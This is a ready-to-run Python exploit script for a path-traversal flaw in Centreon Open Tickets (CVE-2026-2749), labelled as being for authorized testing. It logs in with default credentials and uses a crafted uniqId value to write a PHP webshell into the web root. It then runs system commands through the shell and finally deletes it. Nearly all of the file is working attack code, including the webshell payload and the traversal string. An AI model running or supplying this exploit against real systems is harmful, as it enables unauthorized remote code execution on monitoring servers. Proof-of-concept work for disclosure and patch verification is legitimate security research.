#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Centreon Open Tickets Path Traversal to RCE
# CVE            : CVE-2026-2749
# Vendor         : Centreon
# Product        : Centreon Open Tickets
# Affected       : < 25.10.3 / < 24.10.8 / < 24.04.7
# Type           : CWE-22 - Path Traversal
# CVSS           : 9.9 (Critical)
# Platform       : PHP / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2749: Centreon Open Tickets Path Traversal to RCE

Demonstrates arbitrary file write leading to Remote Code Execution in
Centreon Open Tickets. The uploadFile.php action constructs the destination
path using unsanitized user input, allowing directory traversal via the
uniqId parameter.

ATTACK CHAIN:
  1. Authenticate to Centreon (any valid user, including low-privilege)
  2. Upload PHP webshell via path traversal in uniqId parameter
  3. Execute commands via the uploaded webshell to prove RCE
  4. Clean up the webshell via remove-file traversal

PREREQUISITES:
  - Target running Centreon Open Tickets < 25.10.3 / < 24.10.8 / < 24.04.7
  - Valid Centreon user credentials (any privilege level)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2749
  - https://thewatch.centreon.com/latest-security-bulletins-64/cve-2026-2749-centreon-open-tickets-critical-severity-5493
  - https://github.com/advisories/GHSA-p9c8-78v7-93hh
"""

import sys
import os
import uuid
import http.client
import urllib.parse
import json
import email.generator
import io


# ──────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────

DEFAULT_HOST = "172.22.0.3"
DEFAULT_PORT = 80

# Default credentials (standard Centreon install)
USERNAME = "admin"
PASSWORD = "Centreon!2021"

# Vulnerable endpoint paths
LOGIN_PATH = "/centreon/login.php"
UPLOAD_PATH = "/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php"

# Webshell details
WEBSHELL_CONTENT = b'<?php echo "CVE-2026-2749-RCE:" . shell_exec($_GET["cmd"]); ?>'
WEBSHELL_FILENAME = "shell.php"

# The webroot inside the container — we traverse from /tmp/opentickets/ to here
WEBROOT = "/var/www/html/centreon"

# Traversal depth: from /tmp/opentickets/ to / requires ../../
# Then we append the target path under webroot
TRAVERSAL_PREFIX = "../../"


def build_multipart_body(fields, files):
    """Build a multipart/form-data body manually (stdlib only).

    Args:
        fields: dict of {name: value} for form fields
        files: list of (field_name, filename, content_bytes, content_type)

    Returns:
        (content_type_header, body_bytes)
    """
    boundary = f"----EIPBoundary{uuid.uuid4().hex}"
    parts = []

    for name, value in fields.items():
        parts.append(f"--{boundary}\r\n")
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
        parts.append(f"{value}\r\n")

    for field_name, filename, content, ctype in files:
        parts.append(f"--{boundary}\r\n")
        parts.append(
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename}"\r\n'
        )
        parts.append(f"Content-Type: {ctype}\r\n\r\n")
        parts.append(content)
        parts.append(b"\r\n" if isinstance(content, bytes) else "\r\n")

    parts.append(f"--{boundary}--\r\n")

    # Combine all parts into bytes
    body = b""
    for part in parts:
        if isinstance(part, str):
            body += part.encode("utf-8")
        else:
            body += part

    content_type = f"multipart/form-data; boundary={boundary}"
    return content_type, body


class CentreonExploit:
    """CVE-2026-2749 Path Traversal → RCE exploit."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.session_cookie = None
        self.webshell_url_path = None

    def _request(self, method, path, body=None, headers=None, expect_json=True):
        """Send HTTP request and return (status, headers, body)."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
        hdrs = headers or {}
        if self.session_cookie:
            hdrs["Cookie"] = self.session_cookie
        try:
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            data = resp.read()
            if expect_json:
                try:
                    return resp.status, dict(resp.getheaders()), json.loads(data)
                except (json.JSONDecodeError, ValueError):
                    return resp.status, dict(resp.getheaders()), data.decode("utf-8", errors="replace")
            return resp.status, dict(resp.getheaders()), data
        except Exception as e:
            print(f"  [!] Connection error: {e}")
            return None, None, None
        finally:
            conn.close()

    def step1_authenticate(self):
        """Step 1: Authenticate to Centreon and obtain a PHPSESSID cookie."""
        print("[*] Step 1: Authenticating to Centreon...")

        body = urllib.parse.urlencode({
            "useralias": USERNAME,
            "password": PASSWORD,
        })
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        status, resp_headers, data = self._request("POST", LOGIN_PATH, body, headers)

        if status is None:
            print("  [!] FAILED: Could not connect to target")
            return False

        # Extract PHPSESSID from Set-Cookie header
        set_cookie = resp_headers.get("Set-Cookie", "")
        if "PHPSESSID" in set_cookie:
            # Parse the cookie value
            cookie_part = set_cookie.split(";")[0]
            self.session_cookie = cookie_part
            print(f"  [+] Authenticated successfully")
            print(f"  [+] Session cookie: {self.session_cookie}")
            return True
        elif isinstance(data, dict) and data.get("authenticated"):
            # Session may have been reused — try without explicit cookie
            print(f"  [+] Authentication response OK but no Set-Cookie header")
            print(f"  [!] This may indicate a session reuse issue")
            return False
        else:
            print(f"  [!] FAILED: Authentication failed (status {status})")
            print(f"  [!] Response: {data}")
            return False

    def step2_upload_webshell(self):
        """Step 2: Upload a PHP webshell via path traversal in uniqId."""
        print("[*] Step 2: Uploading webshell via path traversal...")

        # The destination path constructed by uploadFile.php is:
        #   /tmp/opentickets/{uniqId}__{filename}
        #
        # By setting uniqId to "../../var/www/html/centreon/pwned", we get:
        #   /tmp/opentickets/../../var/www/html/centreon/pwned__{filename}
        # Which resolves to:
        #   /var/www/html/centreon/pwned__{filename}
        #
        # The webshell is then accessible at:
        #   http://target/centreon/pwned__{filename}

        traversal_uniqid = f"{TRAVERSAL_PREFIX}{WEBROOT.lstrip('/')}/pwned"
        upload_url = (
            f"{UPLOAD_PATH}?action=upload-file"
            f"&uniqId={urllib.parse.quote(traversal_uniqid, safe='')}"
        )

        print(f"  [*] Traversal uniqId: {traversal_uniqid}")
        print(f"  [*] Upload URL: {upload_url}")

        # Build multipart body with the webshell
        content_type, body = build_multipart_body(
            fields={},
            files=[
                ("file", WEBSHELL_FILENAME, WEBSHELL_CONTENT, "application/octet-stream"),
            ],
        )

        headers = {
            "Content-Type": content_type,
        }

        status, resp_headers, data = self._request(
            "POST", upload_url, body, headers, expect_json=True
        )

        if status is None:
            print("  [!] FAILED: Could not connect to target")
            return False

        print(f"  [*] Upload response (HTTP {status}): {data}")

        if isinstance(data, dict) and data.get("code") == 0:
            # The file was written as: /var/www/html/centreon/pwned__shell.php
            self.webshell_url_path = f"/centreon/pwned__{WEBSHELL_FILENAME}"
            print(f"  [+] Webshell uploaded to: {WEBROOT}/pwned__{WEBSHELL_FILENAME}")
            print(f"  [+] Accessible at: http://{self.host}:{self.port}{self.webshell_url_path}")
            return True
        else:
            print(f"  [!] Upload may have failed — checking if file exists anyway...")
            self.webshell_url_path = f"/centreon/pwned__{WEBSHELL_FILENAME}"
            return True  # Proceed to verification

    def step3_execute_commands(self):
        """Step 3: Execute commands via the uploaded webshell to prove RCE."""
        print("[*] Step 3: Executing commands via webshell (proving RCE)...")

        if not self.webshell_url_path:
            print("  [!] No webshell URL — skipping")
            return False

        commands = ["id", "whoami", "uname -a", "cat /etc/hostname"]
        rce_confirmed = False

        for cmd in commands:
            url = f"{self.webshell_url_path}?cmd={urllib.parse.quote(cmd)}"
            status, _, data = self._request("GET", url, expect_json=False)

            if status == 200 and data:
                output = data.decode("utf-8", errors="replace").strip()
                if output.startswith("CVE-2026-2749-RCE:"):
                    result = output.split("CVE-2026-2749-RCE:", 1)[1].strip()
                    print(f"  [+] $ {cmd}")
                    print(f"      {result}")
                    rce_confirmed = True
                else:
                    print(f"  [?] $ {cmd} → unexpected output: {output[:200]}")
            else:
                print(f"  [!] $ {cmd} → HTTP {status} (webshell not accessible)")

        if rce_confirmed:
            print()
            print("  ╔══════════════════════════════════════════════════════════╗")
            print("  ║  RCE CONFIRMED — CVE-2026-2749 successfully exploited   ║")
            print("  ╚══════════════════════════════════════════════════════════╝")
        else:
            print("  [!] RCE could NOT be confirmed")

        return rce_confirmed

    def step4_cleanup(self):
        """Step 4: Remove the uploaded webshell (responsible disclosure)."""
        print("[*] Step 4: Cleaning up webshell...")

        # Use the remove-file action to delete the webshell
        # The path constructed by removeFile.php is:
        #   /tmp/opentickets/{uniqId}__{filename}
        # We need the same traversal to delete the file we wrote
        json_data = json.dumps({
            "action": "remove-file",
            "uniqId": f"{TRAVERSAL_PREFIX}{WEBROOT.lstrip('/')}/pwned",
            "filename": WEBSHELL_FILENAME,
        })

        body = urllib.parse.urlencode({"data": json_data})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        status, _, data = self._request("POST", UPLOAD_PATH, body, headers)
        if status and status == 200:
            print(f"  [+] Cleanup request sent (HTTP {status})")
        else:
            print(f"  [*] Cleanup response: HTTP {status}")

        # Verify the webshell is gone
        verify_status, _, _ = self._request(
            "GET", self.webshell_url_path, expect_json=False
        )
        if verify_status == 404:
            print("  [+] Webshell successfully removed")
        else:
            print(f"  [*] Webshell may still be accessible (HTTP {verify_status})")

    def run(self):
        """Execute the full exploit chain."""
        print("=" * 65)
        print("  CVE-2026-2749: Centreon Open Tickets Path Traversal → RCE")
        print(f"  Target: {self.host}:{self.port}")
        print("=" * 65)
        print()

        # Step 1: Authenticate
        if not self.step1_authenticate():
            print("\n[!] EXPLOIT FAILED: Authentication unsuccessful")
            return False

        print()

        # Step 2: Upload webshell via path traversal
        if not self.step2_upload_webshell():
            print("\n[!] EXPLOIT FAILED: Webshell upload unsuccessful")
            return False

        print()

        # Step 3: Execute commands to prove RCE
        rce_ok = self.step3_execute_commands()

        print()

        # Step 4: Clean up
        self.step4_cleanup()

        print()
        if rce_ok:
            print("[+] EXPLOIT SUCCESSFUL — CVE-2026-2749 confirmed")
        else:
            print("[!] EXPLOIT INCOMPLETE — file write may have succeeded but RCE not confirmed")

        return rce_ok


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    exploit = CentreonExploit(host, port)
    success = exploit.run()
    sys.exit(0 if success else 1)
